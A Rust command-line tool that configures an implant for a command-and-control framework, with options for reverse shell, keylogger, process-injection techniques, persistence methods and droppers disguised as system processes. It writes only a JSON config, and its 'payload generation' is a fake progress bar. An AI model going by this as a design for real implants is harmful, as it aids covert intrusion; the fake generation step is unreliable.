//! Configurator 
//! CLI for generating payload configurations

use anyhow::Result;
use clap::{Parser, Subcommand};
use serde::{Deserialize, Serialize};
use indicatif::ProgressStyle;
use indicatif::ProgressBar;
use dialoguer::{Input, Select, MultiSelect, Confirm};

#[derive(Parser)]
#[command(author, version, about, long_about = None)]
struct Cli {
    #[command(subcommand)]
    command: Commands,
}

#[derive(Subcommand)]
enum Commands {
    Generate,
    Listener,
}

#[derive(Debug, Serialize, Deserialize)]
struct PayloadConfiguration {
    lhost: String,
    lport: u16,
    https: bool,
    interval: u64,
    jitter: u8,
    arch: String,
    format: String,
    features: Vec<String>,
    injection_method: String,
    persistence_method: String,
    spoofed_name: Option<String>,
}

#[tokio::main]
async fn main() -> Result<()> {
    env_logger::init();
    let cli = Cli::parse();

    match cli.command {
        Commands::Generate => generate().await?,
        Commands::Listener => todo!(),
    }
    Ok(())
}

async fn generate() -> Result<()> {
    
    println!("-- Server ---------------------------------");
    let lhost: String = Input::new().with_prompt("Server Host").interact()?;
    let lport: u16 = Input::new().with_prompt("Server Port").interact()?;
    let https: bool = Confirm::new().with_prompt("Use HTTPS?").default(true).interact()?;
    println!();
    
    
    println!("-- Beacon ---------------------------------");
    let interval: u64 = Input::new().with_prompt("Beacon Interval (seconds)").default(60).interact()?;
    let jitter: u8 = Input::new().with_prompt("Beacon Jitter (0-50%)").default(20).validate_with(|j: &u8|{
        if *j <= 50 {
            Ok(())
        } else {
            Err("Jitter must be between 0 and 50")
        }
    }).interact()?;
    println!();


    println!("-- Output ---------------------------------");
    let arch = Select::new().with_prompt("Output Architecture").items(&["X86", "X64"]).default(1).interact()?;
    let archstr = if arch == 1 { "X64" } else { "X86" };
    let format = Select::new().with_prompt("Output Format").items(&["EXE", "DLL", "ShellCode", "PowerShell", "PE"]).default(0).interact()?;
    let formatstr = match format {
        0 => "exe",
        1 => "dll",
        2 => "shellcode",
        3 => "powershell",
        4 => "pe",
        _ => unreachable!(),
    };
    println!();
    

    println!("-- Features ---------------------------------");
    let features_options = vec!["Reverse Shell", "File Transfer", "Keylogger", "Screenshot", "Process Management", "Registry Access", "BOF Loader"];
    let features = MultiSelect::new().with_prompt("Select Features (space to toggle, enter to confirm)").items(&features_options).defaults(&[true, true, false, false, true, false, true]).interact()?;
    let selected : Vec<String> = features.iter().map(|&i| features_options[i].to_lowercase().replace(" ", "-")).collect();
    println!();

    println!("-- Injection ---------------------------------");
    let injection_options = vec!["CRT", "APC Queue", "Early Bird", "Thread Hijacking", "Process Hollowing", "Reflective Loading"];
    let injection = Select::new().with_prompt("Injection Method").items(&injection_options).default(0).interact()?;
    let injectionstr = match injection {
        0 => "crt",
        1 => "apc",
        2 => "early_bird",
        3 => "thread_hijacking",
        4 => "process_hollowing",
        5 => "reflective_loading",
        _ => "early_bird",
    };
    println!();

    println!("-- Persistence ---------------------------------");
    let persist_options = vec!["None", "Registry Run Keys", "Scheduled Task", "WMI Event Subscription", "Startup Folder"];
    let persist = Select::new().with_prompt("Persistence Method").items(&persist_options).default(0).interact()?;
    let persiststr = match persist {
        0 => "none",
        1 => "registry",
        2 => "scheduled_task",
        3 => "wmi_event",
        4 => "startup_folder",
        _ => "none",
    };
    println!();

    println!("-- Dropper ---------------------------------");
    let use_dropper = Confirm::new().with_prompt("Use Dropper?").default(false).interact()?;
    let spoofed_name = if use_dropper {
        let spoof_options = vec!["Setup.exe", "Update.exe", "svchost.exe", "explorer.exe", "rundll32.exe", "Custom..."];
        let spoof = Select::new().with_prompt("Spoofed Name").items(&spoof_options).default(0).interact()?;
        if spoof == 5 {
            Some(Input::new().with_prompt("Custom Spoofed Name").default("Setup.exe".to_string()).interact()?)
        } else {
            Some(spoof_options[spoof].to_string())
        }
    } else {
        None
    };
    println!();

    let config = PayloadConfiguration {
        lhost,
        lport,
        https,
        interval,
        jitter,
        arch: archstr.to_string(),
        format: formatstr.to_string(),
        features: selected,
        injection_method: injectionstr.to_string(),
        persistence_method: persiststr.to_string(),
        spoofed_name
    };

    println!("-- Configuration Summary ---------------------------------");
    println!("LHOST:                {}", config.lhost);
    println!("LPORT:                {}", config.lport);
    println!("HTTPS:                {}", config.https);
    println!("INTERVAL:             {}", config.interval);
    println!("JITTER:               {}", config.jitter);
    println!("ARCH:                 {}", config.arch);
    println!("FORMAT:               {}", config.format);
    println!("FEATURES:             {:?}", config.features);
    println!("INJECTION METHOD:     {}", config.injection_method);
    println!("PERSISTENCE METHOD:   {}", config.persistence_method);
    println!("SPOOFED NAME:         {:?}", config.spoofed_name);
    println!();

    let confirm = Confirm::new().with_prompt("Generate payload with above configuration?").default(true).interact()?;
    if !confirm {
        println!("Generation aborted.");
        return Ok(());
    }

    let output: String = Input::new().with_prompt("Output File Name").default(format!("client.{}", config.format)).interact()?;
    
    let pb = ProgressBar::new(100);
    pb.set_style(ProgressStyle::with_template("{spinner:.green} [{elapsed_precise}] [{bar:40.cyan/blue}] {pos:>3}% {msg}").unwrap()
        .tick_strings(&["⣾", "⣷", "⣯", "⣟", "⣻", "⣽", "⣾", "⣷", "⣯", "⣟", "⣻", "⣽"]));
    for i in 0..=100 {
        pb.set_position(i);
        tokio::time::sleep(std::time::Duration::from_millis(50)).await;
    }
    pb.finish_with_message("Payload Generated.");

    let config_json = serde_json::to_string_pretty(&config)?;
    std::fs::write(format!("{}.config.json", output), config_json)?;
    
    println!();
    println!("Configuration saved to {}.config.json", output);
    Ok(())
}